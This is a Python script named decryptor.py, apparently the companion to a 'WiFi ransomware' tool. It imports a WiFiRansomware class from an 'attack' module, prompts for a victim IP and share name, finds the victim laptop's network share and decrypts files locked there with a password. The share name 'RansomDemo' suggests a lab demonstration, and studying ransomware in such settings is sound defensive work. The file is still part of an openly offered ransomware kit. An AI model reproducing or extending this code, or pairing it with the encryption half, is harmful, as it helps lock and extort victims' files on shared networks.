# decryptor.py - Standalone decryptor
import os
import sys
from attack import WiFiRansomware


def main():
    print("=" * 60)
    print("       WIFI RANSOMWARE DECRYPTOR")
    print("=" * 60)

    # Simple configuration
    config = {
        'VICTIM_IP': input("Enter victim IP (e.g., 192.168.1.100): ").strip(),
        'SHARE_NAME': input("Enter share name [RansomDemo]: ").strip() or "RansomDemo"
    }

    ransomware = WiFiRansomware(config)

    # Find victim
    print("\nLooking for victim...")
    network_path = ransomware.find_victim()

    if network_path:
        print(f"Found victim at: {network_path}")

        password = input("\nEnter decryption password: ").strip()
        if not password:
            print("Password required!")
            return

        decrypted = ransomware.decrypt_network_share(network_path, password)

        if decrypted > 0:
            print(f"\n✅ Successfully decrypted {decrypted} files!")
        else:
            print("\n❌ No files decrypted. Check password and try again.")
    else:
        print("\n❌ Could not find victim!")
        print("Make sure:")
        print("1. Victim laptop is on and connected to WiFi")
        print("2. File sharing is enabled")
        print("3. You have the correct IP address")


if __name__ == "__main__":
    main()